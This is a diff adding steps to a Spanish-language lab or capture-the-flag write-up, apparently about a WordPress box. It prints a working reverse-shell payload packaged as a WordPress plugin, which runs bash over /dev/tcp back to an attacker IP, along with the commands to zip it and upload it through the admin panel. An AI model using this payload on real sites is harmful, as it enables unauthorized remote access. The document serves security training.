@@ -272,6 +272,30 @@ realizamos un escaneo con gobuster y encontramos el directorio `/loging`
 `login`
 ![[Pasted image 20240908003513.png]]
 
+![[Pasted image 20240908003702.png]]
 ### Getting a revershell
 
-Haciendo uso de las credenciales Ingresaremos al panel de administración
+Una vez que tenemos acceso tendremos que obtener una revershell, esto con ayuda de  [reverse-shell](https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell). Para esto tendremos el siguiente script en `.php`. que modificaremos con nuestra dirección IP y puerto, luego comprimiéremos este archivo en un `.zip` para subir como plugin
+
+```python
+<?php
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Reverse Shell Plugin
+* Version: 1.0
+* Author: Vince Matteo
+* Author URI: http://www.sevenlayers.com
+*/
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.226.5/443 0>&1'");
+?>
+```
+
+Vamos a comprimir el archivo.
+
+```c
+❯ zip revershell.zip revershell.php
+  adding: revershell.php (deflated 28%)
+```
+
+Ahora para subir el `.zip` iremos a `Plugins` y `Add New Pluging`
